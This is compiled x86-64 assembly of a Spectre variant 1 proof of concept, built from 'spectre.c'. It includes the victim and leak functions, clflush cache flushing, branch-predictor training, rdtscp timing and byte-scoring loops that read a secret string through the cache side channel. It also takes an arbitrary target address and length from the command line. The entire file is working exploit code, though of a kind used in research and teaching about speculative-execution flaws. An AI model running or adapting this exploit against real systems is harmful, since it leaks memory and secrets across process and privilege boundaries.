	.text
	.intel_syntax noprefix
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	mov	qword ptr [rbp - 16], rdi
	mov	rax, qword ptr [rbp - 16]
	mov	ecx, dword ptr [rip + array1_size]
	movsxd	rcx, ecx
	cmp	rax, rcx
	jae	.LBB0_2
# %bb.1:
	mov	dword ptr [rbp - 4], 1
	jmp	.LBB0_3
.LBB0_2:
	mov	dword ptr [rbp - 4], 0
.LBB0_3:
	mov	eax, dword ptr [rbp - 4]
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leak_data                       # -- Begin function leak_data
	.p2align	4, 0x90
	.type	leak_data,@function
leak_data:                              # @leak_data
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	mov	qword ptr [rbp - 8], rdi
	mov	rax, qword ptr [rbp - 8]
	mov	ecx, dword ptr [rip + array1_size]
	movsxd	rcx, ecx
	cmp	rax, rcx
	jae	.LBB1_2
# %bb.1:
	mov	rcx, qword ptr [rbp - 8]
	xor	rcx, 255
	lea	rax, [rip + array1]
	movzx	eax, byte ptr [rax + rcx]
	shl	eax, 9
	movsxd	rcx, eax
	lea	rax, [rip + array2]
	movzx	ecx, byte ptr [rax + rcx]
	movzx	eax, byte ptr [rip + temp]
	and	eax, ecx
                                        # kill: def $al killed $al killed $eax
	mov	byte ptr [rip + temp], al
.LBB1_2:
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end1:
	.size	leak_data, .Lfunc_end1-leak_data
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	sub	rsp, 16
	mov	qword ptr [rbp - 8], rdi
	mov	rdi, qword ptr [rbp - 8]
	call	leak_data
	add	rsp, 16
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	sub	rsp, 144
	mov	qword ptr [rbp - 24], rdi
	mov	qword ptr [rbp - 32], rsi
	mov	qword ptr [rbp - 40], rdx
	mov	dword ptr [rbp - 64], 0
	mov	dword ptr [rbp - 48], 0
.LBB3_1:                                # =>This Inner Loop Header: Depth=1
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB3_4
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	movsxd	rcx, dword ptr [rbp - 48]
	lea	rax, [rip + readMemoryByte.results]
	mov	dword ptr [rax + 4*rcx], 0
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB3_1
.LBB3_4:
	mov	dword ptr [rbp - 44], 999
.LBB3_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_11 Depth 2
                                        #       Child Loop BB3_13 Depth 3
                                        #     Child Loop BB3_19 Depth 2
                                        #     Child Loop BB3_26 Depth 2
	cmp	dword ptr [rbp - 44], 0
	jle	.LBB3_42
# %bb.6:                                #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [rbp - 48], 0
.LBB3_7:                                #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [rbp - 48]
	shl	eax, 9
	movsxd	rcx, eax
	lea	rax, [rip + array2]
	add	rax, rcx
	clflush	byte ptr [rax]
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB3_7
.LBB3_10:                               #   in Loop: Header=BB3_5 Depth=1
	mov	eax, dword ptr [rbp - 44]
	mov	ecx, dword ptr [rip + array1_size]
	cdq
	idiv	ecx
	movsxd	rax, edx
	mov	qword ptr [rbp - 72], rax
	mov	dword ptr [rbp - 52], 29
.LBB3_11:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_13 Depth 3
	cmp	dword ptr [rbp - 52], 0
	jl	.LBB3_18
# %bb.12:                               #   in Loop: Header=BB3_11 Depth=2
	clflush	byte ptr [rip + array1_size]
	mov	dword ptr [rbp - 108], 0
.LBB3_13:                               #   Parent Loop BB3_5 Depth=1
                                        #     Parent Loop BB3_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	mov	eax, dword ptr [rbp - 108]
	cmp	eax, 100
	jge	.LBB3_16
# %bb.14:                               #   in Loop: Header=BB3_13 Depth=3
	jmp	.LBB3_15
.LBB3_15:                               #   in Loop: Header=BB3_13 Depth=3
	mov	eax, dword ptr [rbp - 108]
	add	eax, 1
	mov	dword ptr [rbp - 108], eax
	jmp	.LBB3_13
.LBB3_16:                               #   in Loop: Header=BB3_11 Depth=2
	mov	eax, dword ptr [rbp - 52]
	mov	ecx, 6
	cdq
	idiv	ecx
	mov	eax, edx
	sub	eax, 1
	and	eax, -65536
	cdqe
	mov	qword ptr [rbp - 80], rax
	mov	rax, qword ptr [rbp - 80]
	mov	rcx, qword ptr [rbp - 80]
	shr	rcx, 16
	or	rax, rcx
	mov	qword ptr [rbp - 80], rax
	mov	rax, qword ptr [rbp - 72]
	mov	rcx, qword ptr [rbp - 80]
	mov	rdx, qword ptr [rbp - 24]
	xor	rdx, qword ptr [rbp - 72]
	and	rcx, rdx
	xor	rax, rcx
	mov	qword ptr [rbp - 80], rax
	mov	rdi, qword ptr [rbp - 80]
	call	victim_function
# %bb.17:                               #   in Loop: Header=BB3_11 Depth=2
	mov	eax, dword ptr [rbp - 52]
	add	eax, -1
	mov	dword ptr [rbp - 52], eax
	jmp	.LBB3_11
.LBB3_18:                               #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [rbp - 48], 0
.LBB3_19:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB3_25
# %bb.20:                               #   in Loop: Header=BB3_19 Depth=2
	imul	eax, dword ptr [rbp - 48], 167
	add	eax, 13
	and	eax, 255
	mov	dword ptr [rbp - 60], eax
	mov	eax, dword ptr [rbp - 60]
	shl	eax, 9
	movsxd	rcx, eax
	lea	rax, [rip + array2]
	add	rax, rcx
	mov	qword ptr [rbp - 104], rax
	lea	rax, [rbp - 64]
	mov	qword ptr [rbp - 8], rax
	mov	rax, qword ptr [rbp - 8]
	mov	qword ptr [rbp - 128], rax      # 8-byte Spill
	rdtscp
	mov	rsi, rdx
	mov	edx, ecx
	mov	rcx, qword ptr [rbp - 128]      # 8-byte Reload
	shl	rsi, 32
	or	rax, rsi
	mov	dword ptr [rcx], edx
	mov	qword ptr [rbp - 88], rax
	mov	rax, qword ptr [rbp - 104]
	mov	al, byte ptr [rax]
	movzx	eax, al
	mov	dword ptr [rbp - 64], eax
	lea	rax, [rbp - 64]
	mov	qword ptr [rbp - 16], rax
	mov	rax, qword ptr [rbp - 16]
	mov	qword ptr [rbp - 120], rax      # 8-byte Spill
	rdtscp
	mov	rsi, rdx
	mov	edx, ecx
	mov	rcx, qword ptr [rbp - 120]      # 8-byte Reload
	shl	rsi, 32
	or	rax, rsi
	mov	dword ptr [rcx], edx
	sub	rax, qword ptr [rbp - 88]
	mov	qword ptr [rbp - 96], rax
	cmp	qword ptr [rbp - 96], 100
	ja	.LBB3_23
# %bb.21:                               #   in Loop: Header=BB3_19 Depth=2
	mov	eax, dword ptr [rbp - 60]
	mov	dword ptr [rbp - 132], eax      # 4-byte Spill
	mov	eax, dword ptr [rbp - 44]
	mov	ecx, dword ptr [rip + array1_size]
	cdq
	idiv	ecx
	mov	eax, dword ptr [rbp - 132]      # 4-byte Reload
	movsxd	rdx, edx
	lea	rcx, [rip + array1]
	movzx	ecx, byte ptr [rcx + rdx]
	cmp	eax, ecx
	je	.LBB3_23
# %bb.22:                               #   in Loop: Header=BB3_19 Depth=2
	movsxd	rcx, dword ptr [rbp - 60]
	lea	rax, [rip + readMemoryByte.results]
	mov	edx, dword ptr [rax + 4*rcx]
	add	edx, 1
	lea	rax, [rip + readMemoryByte.results]
	mov	dword ptr [rax + 4*rcx], edx
.LBB3_23:                               #   in Loop: Header=BB3_19 Depth=2
	jmp	.LBB3_24
.LBB3_24:                               #   in Loop: Header=BB3_19 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB3_19
.LBB3_25:                               #   in Loop: Header=BB3_5 Depth=1
	mov	dword ptr [rbp - 56], -1
	mov	dword ptr [rbp - 52], -1
	mov	dword ptr [rbp - 48], 0
.LBB3_26:                               #   Parent Loop BB3_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	dword ptr [rbp - 48], 256
	jge	.LBB3_36
# %bb.27:                               #   in Loop: Header=BB3_26 Depth=2
	cmp	dword ptr [rbp - 52], 0
	jl	.LBB3_29
# %bb.28:                               #   in Loop: Header=BB3_26 Depth=2
	movsxd	rcx, dword ptr [rbp - 48]
	lea	rax, [rip + readMemoryByte.results]
	mov	eax, dword ptr [rax + 4*rcx]
	movsxd	rdx, dword ptr [rbp - 52]
	lea	rcx, [rip + readMemoryByte.results]
	cmp	eax, dword ptr [rcx + 4*rdx]
	jl	.LBB3_30
.LBB3_29:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [rbp - 52]
	mov	dword ptr [rbp - 56], eax
	mov	eax, dword ptr [rbp - 48]
	mov	dword ptr [rbp - 52], eax
	jmp	.LBB3_34
.LBB3_30:                               #   in Loop: Header=BB3_26 Depth=2
	cmp	dword ptr [rbp - 56], 0
	jl	.LBB3_32
# %bb.31:                               #   in Loop: Header=BB3_26 Depth=2
	movsxd	rcx, dword ptr [rbp - 48]
	lea	rax, [rip + readMemoryByte.results]
	mov	eax, dword ptr [rax + 4*rcx]
	movsxd	rdx, dword ptr [rbp - 56]
	lea	rcx, [rip + readMemoryByte.results]
	cmp	eax, dword ptr [rcx + 4*rdx]
	jl	.LBB3_33
.LBB3_32:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [rbp - 48]
	mov	dword ptr [rbp - 56], eax
.LBB3_33:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_34
.LBB3_34:                               #   in Loop: Header=BB3_26 Depth=2
	jmp	.LBB3_35
.LBB3_35:                               #   in Loop: Header=BB3_26 Depth=2
	mov	eax, dword ptr [rbp - 48]
	add	eax, 1
	mov	dword ptr [rbp - 48], eax
	jmp	.LBB3_26
.LBB3_36:                               #   in Loop: Header=BB3_5 Depth=1
	movsxd	rcx, dword ptr [rbp - 52]
	lea	rax, [rip + readMemoryByte.results]
	mov	eax, dword ptr [rax + 4*rcx]
	movsxd	rdx, dword ptr [rbp - 56]
	lea	rcx, [rip + readMemoryByte.results]
	mov	ecx, dword ptr [rcx + 4*rdx]
	shl	ecx, 1
	add	ecx, 5
	cmp	eax, ecx
	jge	.LBB3_39
# %bb.37:                               #   in Loop: Header=BB3_5 Depth=1
	movsxd	rcx, dword ptr [rbp - 52]
	lea	rax, [rip + readMemoryByte.results]
	cmp	dword ptr [rax + 4*rcx], 2
	jne	.LBB3_40
# %bb.38:                               #   in Loop: Header=BB3_5 Depth=1
	movsxd	rcx, dword ptr [rbp - 56]
	lea	rax, [rip + readMemoryByte.results]
	cmp	dword ptr [rax + 4*rcx], 0
	jne	.LBB3_40
.LBB3_39:
	jmp	.LBB3_42
.LBB3_40:                               #   in Loop: Header=BB3_5 Depth=1
	jmp	.LBB3_41
.LBB3_41:                               #   in Loop: Header=BB3_5 Depth=1
	mov	eax, dword ptr [rbp - 44]
	add	eax, -1
	mov	dword ptr [rbp - 44], eax
	jmp	.LBB3_5
.LBB3_42:
	mov	eax, dword ptr [rbp - 64]
	xor	eax, dword ptr [rip + readMemoryByte.results]
	mov	dword ptr [rip + readMemoryByte.results], eax
	mov	eax, dword ptr [rbp - 52]
	mov	cl, al
	mov	rax, qword ptr [rbp - 32]
	mov	byte ptr [rax], cl
	movsxd	rcx, dword ptr [rbp - 52]
	lea	rax, [rip + readMemoryByte.results]
	mov	ecx, dword ptr [rax + 4*rcx]
	mov	rax, qword ptr [rbp - 40]
	mov	dword ptr [rax], ecx
	mov	eax, dword ptr [rbp - 56]
	mov	cl, al
	mov	rax, qword ptr [rbp - 32]
	mov	byte ptr [rax + 1], cl
	movsxd	rcx, dword ptr [rbp - 56]
	lea	rax, [rip + readMemoryByte.results]
	mov	ecx, dword ptr [rax + 4*rcx]
	mov	rax, qword ptr [rbp - 40]
	mov	dword ptr [rax + 4], ecx
	add	rsp, 144
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset rbp, -16
	mov	rbp, rsp
	.cfi_def_cfa_register rbp
	sub	rsp, 80
	mov	dword ptr [rbp - 4], 0
	mov	dword ptr [rbp - 8], edi
	mov	qword ptr [rbp - 16], rsi
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_3 Depth 2
                                        #     Child Loop BB4_9 Depth 2
	call	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	mov	byte ptr [rbp - 17], al
	movsx	eax, byte ptr [rbp - 17]
	cmp	eax, 114
	jne	.LBB4_22
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	mov	rsi, qword ptr [rip + secret]
	mov	rdx, qword ptr [rip + secret]
	lea	rdi, [rip + .L.str.1]
	mov	al, 0
	call	printf@PLT
	mov	rax, qword ptr [rip + secret]
	lea	rcx, [rip + array1]
	sub	rax, rcx
	mov	qword ptr [rbp - 32], rax
	mov	rdi, qword ptr [rip + secret]
	call	strlen@PLT
                                        # kill: def $eax killed $eax killed $rax
	mov	dword ptr [rbp - 44], eax
	mov	qword ptr [rbp - 56], 0
.LBB4_3:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmp	qword ptr [rbp - 56], 131072
	jae	.LBB4_6
# %bb.4:                                #   in Loop: Header=BB4_3 Depth=2
	mov	rcx, qword ptr [rbp - 56]
	lea	rax, [rip + array2]
	mov	byte ptr [rax + rcx], 1
# %bb.5:                                #   in Loop: Header=BB4_3 Depth=2
	mov	rax, qword ptr [rbp - 56]
	add	rax, 1
	mov	qword ptr [rbp - 56], rax
	jmp	.LBB4_3
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	cmp	dword ptr [rbp - 8], 3
	jne	.LBB4_8
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	mov	rax, qword ptr [rbp - 16]
	mov	rdi, qword ptr [rax + 8]
	lea	rdx, [rbp - 32]
	lea	rsi, [rip + .L.str.2]
	mov	al, 0
	call	__isoc99_sscanf@PLT
	mov	rax, qword ptr [rbp - 32]
	lea	rcx, [rip + array1]
	sub	rax, rcx
	mov	qword ptr [rbp - 32], rax
	mov	rax, qword ptr [rbp - 16]
	mov	rdi, qword ptr [rax + 16]
	lea	rsi, [rip + .L.str.3]
	lea	rdx, [rbp - 44]
	mov	al, 0
	call	__isoc99_sscanf@PLT
	mov	rsi, qword ptr [rbp - 32]
	mov	edx, dword ptr [rbp - 44]
	lea	rdi, [rip + .L.str.4]
	mov	al, 0
	call	printf@PLT
.LBB4_8:                                #   in Loop: Header=BB4_1 Depth=1
	mov	esi, dword ptr [rbp - 44]
	lea	rdi, [rip + .L.str.5]
	mov	al, 0
	call	printf@PLT
	mov	dword ptr [rbp - 60], 0
.LBB4_9:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	mov	eax, dword ptr [rbp - 44]
	add	eax, -1
	mov	dword ptr [rbp - 44], eax
	cmp	eax, 0
	jl	.LBB4_21
# %bb.10:                               #   in Loop: Header=BB4_9 Depth=2
	mov	byte ptr [rip + flag], 1
	mov	rsi, qword ptr [rbp - 32]
	mov	rax, qword ptr [rip + secret]
	movsxd	rcx, dword ptr [rbp - 60]
	movsx	edx, byte ptr [rax + rcx]
	lea	rdi, [rip + .L.str.6]
	mov	al, 0
	call	printf@PLT
	mov	eax, dword ptr [rbp - 60]
	add	eax, 1
	mov	dword ptr [rbp - 60], eax
	mov	rdi, qword ptr [rbp - 32]
	xor	rdi, 255
	lea	rsi, [rbp - 46]
	lea	rdx, [rbp - 40]
	call	readMemoryByte
	mov	rax, qword ptr [rbp - 32]
	add	rax, 1
	mov	qword ptr [rbp - 32], rax
	mov	ecx, dword ptr [rbp - 40]
	mov	edx, dword ptr [rbp - 36]
	shl	edx, 1
	lea	rsi, [rip + .L.str.9]
	lea	rax, [rip + .L.str.8]
	cmp	ecx, edx
	cmovge	rsi, rax
	lea	rdi, [rip + .L.str.7]
	mov	al, 0
	call	printf@PLT
	movzx	eax, byte ptr [rbp - 46]
	mov	dword ptr [rbp - 64], eax       # 4-byte Spill
	movzx	eax, byte ptr [rbp - 46]
	cmp	eax, 31
	jle	.LBB4_13
# %bb.11:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [rbp - 46]
	cmp	eax, 127
	jge	.LBB4_13
# %bb.12:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [rbp - 46]
	mov	dword ptr [rbp - 68], eax       # 4-byte Spill
	jmp	.LBB4_14
.LBB4_13:                               #   in Loop: Header=BB4_9 Depth=2
	mov	eax, 63
	mov	dword ptr [rbp - 68], eax       # 4-byte Spill
	jmp	.LBB4_14
.LBB4_14:                               #   in Loop: Header=BB4_9 Depth=2
	mov	esi, dword ptr [rbp - 64]       # 4-byte Reload
	mov	edx, dword ptr [rbp - 68]       # 4-byte Reload
	mov	ecx, dword ptr [rbp - 40]
	lea	rdi, [rip + .L.str.10]
	mov	al, 0
	call	printf@PLT
	cmp	dword ptr [rbp - 36], 0
	jle	.LBB4_20
# %bb.15:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [rbp - 45]
	mov	dword ptr [rbp - 72], eax       # 4-byte Spill
	movzx	eax, byte ptr [rbp - 45]
	cmp	eax, 31
	jle	.LBB4_18
# %bb.16:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [rbp - 45]
	cmp	eax, 127
	jge	.LBB4_18
# %bb.17:                               #   in Loop: Header=BB4_9 Depth=2
	movzx	eax, byte ptr [rbp - 45]
	mov	dword ptr [rbp - 76], eax       # 4-byte Spill
	jmp	.LBB4_19
.LBB4_18:                               #   in Loop: Header=BB4_9 Depth=2
	mov	eax, 63
	mov	dword ptr [rbp - 76], eax       # 4-byte Spill
	jmp	.LBB4_19
.LBB4_19:                               #   in Loop: Header=BB4_9 Depth=2
	mov	esi, dword ptr [rbp - 72]       # 4-byte Reload
	mov	edx, dword ptr [rbp - 76]       # 4-byte Reload
	mov	ecx, dword ptr [rbp - 36]
	lea	rdi, [rip + .L.str.11]
	mov	al, 0
	call	printf@PLT
.LBB4_20:                               #   in Loop: Header=BB4_9 Depth=2
	lea	rdi, [rip + .L.str.12]
	mov	al, 0
	call	printf@PLT
	jmp	.LBB4_9
.LBB4_21:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_22:                               #   in Loop: Header=BB4_1 Depth=1
	movsx	eax, byte ptr [rbp - 17]
	cmp	eax, 10
	jne	.LBB4_24
# %bb.23:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_24:                               #   in Loop: Header=BB4_1 Depth=1
	movsx	eax, byte ptr [rbp - 17]
	cmp	eax, 105
	jne	.LBB4_26
# %bb.25:                               #   in Loop: Header=BB4_1 Depth=1
	mov	al, 0
	call	getpid@PLT
	mov	edx, eax
	lea	rdi, [rip + .L.str.13]
	lea	rsi, [rip + check]
	add	rsi, 33
	mov	al, 0
	call	printf@PLT
	jmp	.LBB4_27
.LBB4_26:
	jmp	.LBB4_30
.LBB4_27:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_28
.LBB4_28:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_29
.LBB4_29:                               #   in Loop: Header=BB4_1 Depth=1
	jmp	.LBB4_1
.LBB4_30:
	xor	eax, eax
	add	rsp, 80
	pop	rbp
	.cfi_def_cfa rsp, 8
	ret
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	flag,@object                    # @flag
	.globl	flag
flag:
	.byte	0                               # 0x0
	.size	flag, 1

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.12,@object               # @.str.12
.L.str.12:
	.asciz	"\n"
	.size	.L.str.12, 2

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym leak_data
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym flag
	.addrsig_sym array2
	.addrsig_sym readMemoryByte.results
